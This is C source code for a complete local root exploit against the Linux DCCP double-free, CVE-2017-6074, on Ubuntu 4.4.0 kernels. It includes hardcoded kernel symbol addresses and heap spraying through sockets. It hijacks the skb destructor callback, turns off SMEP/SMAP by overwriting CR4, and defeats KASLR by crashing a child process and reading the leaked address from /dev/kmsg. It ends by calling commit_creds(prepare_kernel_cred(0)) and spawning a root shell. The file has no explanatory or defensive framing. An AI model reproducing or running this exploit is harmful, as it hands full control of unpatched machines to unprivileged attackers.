#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>

//Bypass KASLR
long int offsetKASLR;
long int ENTRY_SYSCALL_64_FASTPATH;

// Needed for local root.
long int COMMIT_CREDS;
long int PREPARE_KERNEL_CRED;
#define SHINFO_OFFSET		1728

// Needed for SMEP_SMAP_BYPASS.
long int NATIVE_WRITE_CR4;
#define CR4_DESIRED_VALUE	0x406e0ul

#define KMALLOC_PAD 128
#define KMALLOC_WARM 64
#define CATCH_FIRST 16
#define CATCH_AGAIN 32

// Port is incremented on each use.
static int port = 11000;

//Stabilize
void select_version(int ver){
	long int commit_creds_array[200];
	long int prepare_kernel_cred[200];
	long int native_write_cr4[200];
	long int entry_SYSCALL_64_fastpath[200];
	
	//4.4.0-31
	commit_creds_array[1] = 0xffffffff810a24a0;
	prepare_kernel_cred[1] = 0xffffffff810a2890;
	native_write_cr4[1] = 0xffffffff81064560;
	entry_SYSCALL_64_fastpath[1] = 0xffffffff8182db1c;

	//4.4.0-62
	commit_creds_array[2] = 0xffffffff810a2840;
	prepare_kernel_cred[2] = 0xffffffff810a2c30;
	native_write_cr4[2] = 0xffffffff81064550;
	entry_SYSCALL_64_fastpath[2] = 0xffffffff818385dc;

	COMMIT_CREDS = commit_creds_array[ver];
	PREPARE_KERNEL_CRED = prepare_kernel_cred[ver];
	NATIVE_WRITE_CR4 = native_write_cr4[ver];
	ENTRY_SYSCALL_64_FASTPATH = entry_SYSCALL_64_fastpath[ver];
}

//Kernel struct
struct ubuf_info {
		uint64_t callback;              // void (*callback)(struct ubuf_info *, bool)
		uint64_t ctx;                   // void *
		uint64_t desc;                  // unsigned long
};

struct skb_shared_info {
	uint8_t  nr_frags;              // unsigned char
	uint8_t  tx_flags;              // __u8
	uint16_t gso_size;              // unsigned short
	uint16_t gso_segs;              // unsigned short
	uint16_t gso_type;              // unsigned short
	uint64_t frag_list;             // struct sk_buff *
	uint64_t hwtstamps;             // struct skb_shared_hwtstamps
	uint32_t tskey;                 // u32
	uint32_t ip6_frag_id;           // __be32
	uint32_t dataref;               // atomic_t
	uint64_t destructor_arg;        // void *
	uint8_t  frags[16][17];         // skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info ui;

void init_skb_buffer(char* buffer, long int *func, long int arg) {
	//if arg = 0 it's mean no arg this exploit can't excute function with arg = 0
	if (arg == 0)
	{
		memset(&buffer[0], 0, 2048);

		struct skb_shared_info *ssi = (struct skb_shared_info *)&buffer[SHINFO_OFFSET];

		ssi->tx_flags = 0xff;
		ssi->destructor_arg = (uint64_t)&ui;
		ssi->nr_frags = 0;
		ssi->frag_list = 0;

		ui.callback = (unsigned long)func;
	}
	else
	{
		memset(&buffer[0], 0, 2048);

		struct skb_shared_info *ssi = (struct skb_shared_info *)&buffer[SHINFO_OFFSET];

		ssi->tx_flags = 0xff;
		ssi->destructor_arg = arg;
		ssi->nr_frags = 0;
		ssi->frag_list = 0;

		mmap(arg&0xfffffffffffff000, 0x1000, 0x7, MAP_SHARED | MAP_ANONYMOUS, -1, 0x0);
		*((long int*)arg) = (unsigned long)func;
	}
}

//Trigger
struct dccp_handle {
	struct sockaddr_in6 sa;
	int s1;
	int s2;
};

void dccp_init(struct dccp_handle *handle, int port) {
	handle->sa.sin6_family = AF_INET6;
	handle->sa.sin6_port = htons(port);
	inet_pton(AF_INET6, "::1", &handle->sa.sin6_addr);
	handle->sa.sin6_flowinfo = 0;
	handle->sa.sin6_scope_id = 0;

	handle->s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	if (handle->s1 == -1) {
		perror("socket(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}

	int rv = bind(handle->s1, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("bind()");
		exit(EXIT_FAILURE);
	}

	rv = listen(handle->s1, 0x9);
	if (rv != 0) {
		perror("listen()");
		exit(EXIT_FAILURE);
	}

	int optval = 8;
	rv = setsockopt(handle->s1, IPPROTO_IPV6, IPV6_RECVPKTINFO, &optval, sizeof(optval));
	if (rv != 0) {
		perror("setsockopt(IPV6_RECVPKTINFO)");
		exit(EXIT_FAILURE);
	}

	handle->s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	if (handle->s1 == -1) {
		perror("socket(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}
}

void dccp_kmalloc_kfree(struct dccp_handle *handle) {
	int rv = connect(handle->s2, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("connect(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}
}

void dccp_kfree_again(struct dccp_handle *handle) {
	int rv = shutdown(handle->s1, SHUT_RDWR);
	if (rv != 0) {
		perror("shutdown(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}
}

void dccp_destroy(struct dccp_handle *handle) {
	close(handle->s1);
	close(handle->s2);
}

//Heap spraying
struct udp_fifo_handle {
	int fds[2];
};

void udp_fifo_init(struct udp_fifo_handle* handle) {
	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, handle->fds);
	if (rv != 0) {
		perror("socketpair()");
		exit(EXIT_FAILURE);
	}
}

void udp_fifo_destroy(struct udp_fifo_handle* handle) {
	close(handle->fds[0]);
	close(handle->fds[1]);
}

void udp_fifo_kmalloc(struct udp_fifo_handle* handle, char *buffer) {
	int rv = send(handle->fds[0], buffer, 1536, 0);
	if (rv != 1536) {
		perror("send()");
		exit(EXIT_FAILURE);
	}
}

void udp_fifo_kmalloc_small(struct udp_fifo_handle* handle) {
	char buffer[128];
	int rv = send(handle->fds[0], &buffer[0], 128, 0);
	if (rv != 128) {
		perror("send()");
		exit(EXIT_FAILURE);
	}
}

void udp_fifo_kfree(struct udp_fifo_handle* handle) {
	char buffer[2048];
	int rv = recv(handle->fds[1], &buffer[0], 1536, 0);
	if (rv != 1536) {
		perror("recv()");
		exit(EXIT_FAILURE);
	}
}

int timer_kmalloc() {
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

#define CONF_RING_FRAMES 1
void timer_schedule(int handle, int timeout) {
	int optval = TPACKET_V3;
	int rv = setsockopt(handle, SOL_PACKET, PACKET_VERSION, &optval, sizeof(optval));
	if (rv != 0) {
		perror("setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}
	struct tpacket_req3 tp;
	memset(&tp, 0, sizeof(tp));
	tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
	tp.tp_block_nr = 1;
	tp.tp_frame_size = getpagesize();
	tp.tp_frame_nr = CONF_RING_FRAMES;
	tp.tp_retire_blk_tov = timeout;
	rv = setsockopt(handle, SOL_PACKET, PACKET_RX_RING, (void *)&tp, sizeof(tp));
	if (rv != 0) {
		perror("setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

void socket_sendmmsg(int sock, char *buffer) {
	struct mmsghdr msg[1];

	msg[0].msg_hdr.msg_iovlen = 0;

	// Buffer to kmalloc.
	msg[0].msg_hdr.msg_control = &buffer[0];
	msg[0].msg_hdr.msg_controllen = 2048;

	// Make sendmmsg exit easy with EINVAL.
	msg[0].msg_hdr.msg_name = "root";
	msg[0].msg_hdr.msg_namelen = 1;

	int rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
	if (rv == -1 && errno != EINVAL) {
		perror("[-] sendmmsg()");
		exit(EXIT_FAILURE);
	}
}

void sendmmsg_kmalloc_kfree(int port, char *buffer) {
	int sock[2];

	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, sock);
	if (rv != 0) {
		perror("socketpair()");
		exit(EXIT_FAILURE);
	}

	socket_sendmmsg(sock[0], buffer);

	close(sock[0]);
}

//Heap warming
void dccp_connect_pad(struct dccp_handle *handle, int port) {
	handle->sa.sin6_family = AF_INET6;
	handle->sa.sin6_port = htons(port);
	inet_pton(AF_INET6, "::1", &handle->sa.sin6_addr);
	handle->sa.sin6_flowinfo = 0;
	handle->sa.sin6_scope_id = 0;

	handle->s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	if (handle->s1 == -1) {
		perror("socket(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}

	int rv = bind(handle->s1, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("bind()");
		exit(EXIT_FAILURE);
	}

	rv = listen(handle->s1, 0x9);
	if (rv != 0) {
		perror("listen()");
		exit(EXIT_FAILURE);
	}

	handle->s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	if (handle->s1 == -1) {
		perror("socket(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}

	rv = connect(handle->s2, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("connect(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}
}

void dccp_kmalloc_pad() {
	int i;
	struct dccp_handle handle;
	for (i = 0; i < 4; i++) {
		dccp_connect_pad(&handle, port++);
	}
}

void timer_kmalloc_pad() {
	int i;
	for (i = 0; i < 4; i++) {
		socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	}
}

void udp_kmalloc_pad() {
	int i, j;
	char dummy[2048];
	struct udp_fifo_handle uh[16];
	for (i = 0; i < KMALLOC_PAD / 16; i++) {
		udp_fifo_init(&uh[i]);
		for (j = 0; j < 16; j++)
			udp_fifo_kmalloc(&uh[i], &dummy[0]);
	}
}

void kmalloc_pad() {
	//debug("dccp kmalloc pad");
	dccp_kmalloc_pad();
	//debug("timer kmalloc pad");
	timer_kmalloc_pad();
	//debug("udp kmalloc pad");
	udp_kmalloc_pad();
}

void udp_kmalloc_warm() {
	int i, j;
	char dummy[2048];
	struct udp_fifo_handle uh[16];
	for (i = 0; i < KMALLOC_WARM / 16; i++) {
		udp_fifo_init(&uh[i]);
		for (j = 0; j < 16; j++)
			udp_fifo_kmalloc(&uh[i], &dummy[0]);
	}
	for (i = 0; i < KMALLOC_WARM / 16; i++) {
		for (j = 0; j < 16; j++)
			udp_fifo_kfree(&uh[i]);
	}
}

void kmalloc_warm() {
	udp_kmalloc_warm();
}

//Get root
void get_root_payload(void) {
	typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
	typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

	_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
	_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

	commit_creds(prepare_kernel_cred(0));
}

void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

void fork_shell() {
	pid_t rv;

	rv = fork();
	if (rv == -1) {
		perror("fork()");
		exit(EXIT_FAILURE);
	}

	if (rv == 0) {
		exec_shell();
	}
}

//MAIN
void Kernel_EXCUTE(long int func, long int arg){
	int i;
	struct dccp_handle dh;
	struct udp_fifo_handle uh1, uh2, uh3;
	char dummy[2048];
	char buffer[2048];

	memset(&dummy[0], 0, 2048);
	init_skb_buffer(&buffer[0], func, arg);

	udp_fifo_init(&uh1);
	udp_fifo_init(&uh2);
	udp_fifo_init(&uh3);

	//debug("kmalloc pad");
	kmalloc_pad();

	//debug("kmalloc warm");
	kmalloc_warm();

	//debug("dccp init");
	dccp_init(&dh, port++);

	//debug("dccp kmalloc kfree");
	dccp_kmalloc_kfree(&dh);

	//debug("catch 1");
	for (i = 0; i < CATCH_FIRST; i++)
		udp_fifo_kmalloc(&uh1, &dummy[0]);

	//debug("dccp kfree again:");
	dccp_kfree_again(&dh);

	//debug("catch 2");
	for (i = 0; i < CATCH_FIRST; i++)
		udp_fifo_kmalloc(&uh2, &dummy[0]);

	//debug("catch 1 -> overwrite");
	for (i = 0; i < CATCH_FIRST; i++) {
		udp_fifo_kfree(&uh1);
		sendmmsg_kmalloc_kfree(port++, &buffer[0]);
	}
	//debug("catch 2 -> free & trigger");
	for (i = 0; i < CATCH_FIRST; i++)
		udp_fifo_kfree(&uh2);

	//debug("catch 1 & 2");
	for (i = 0; i < CATCH_AGAIN; i++)
		udp_fifo_kmalloc(&uh3, &dummy[0]);
}

void bypassKASLR()
{
	//Fork a CRASH to GET REAL_KERNEL_ADDR
	pid_t rv;
	rv = fork();
	if (rv == -1) {
		perror("fork()");
		exit(EXIT_FAILURE);
	}
	if (rv == 0) {
		printf("\tMaking a crash\n");
		Kernel_EXCUTE(0x1000, 0x0);
	}
	sleep(1); //WAIT FOR ITTTTTTT
	printf("\tWaiting for LOG\n");
	sleep(1);

	//Read crash and find addr
	FILE *fp;
	char buff[102400];
	char *found;

	fp = fopen("/dev/kmsg","r");
	while (true)
	{
		fgets(buff, 102400, fp);
		found = strstr (buff,"entry_SYSCALL_64_fastpath");
		if (found)
			break;
	}
	fclose(fp);

	long int minioffset;
	sscanf(found+25, "%lx", &minioffset);
	
	while (true)
	{
		if (strstr(found ,"ffffffff"))
			break;
		found--;
	}
	
	long int real_entry_SYSCALL_64_fastpath;
	sscanf(found, "%lx", &real_entry_SYSCALL_64_fastpath);

	//Adjust the addr
	offsetKASLR = real_entry_SYSCALL_64_fastpath - minioffset - ENTRY_SYSCALL_64_FASTPATH;
	COMMIT_CREDS += offsetKASLR;
	PREPARE_KERNEL_CRED += offsetKASLR;
	NATIVE_WRITE_CR4 += offsetKASLR;
}


int main(int argc, char * argv [])
{
	if (argc != 4){
		printf("Usage: ./CVE-2017-6074 kernel-ver bypassKaslr turnoffsmapsmep\n");
		printf("EX: ./CVE-2017-6074 1 1 1\nThis mean\n\tKenel-ver = 4.4.0-31 see sourcecode for more infomation\n\tBypass KASLR\n\tTurn off SMAP & SMEP\n");
		exit(0);
	}
	select_version(atoi(argv[1]));
	if (atoi(argv[2]))
	{
		printf("[+]Going to calculate REAL_KERNEL_ADDR\n");
		bypassKASLR();
		printf("\tDone!\n");
	}
	if (atoi(argv[3]))
	{
		printf("[+]Going to disable SMAP SMEP\n");
		Kernel_EXCUTE(NATIVE_WRITE_CR4, CR4_DESIRED_VALUE);
		printf("\tDone!\n");
	}
	printf("[+]Going to excute commit_creds(prepare_kernel_cred(0));\n");
	Kernel_EXCUTE(&get_root_payload, 0);
	printf("\tDone!\n");
	printf("[+]Enjoy your shell\n");
	fork_shell();
	while (true){
		sleep(102400);
	}

	return 0;
}
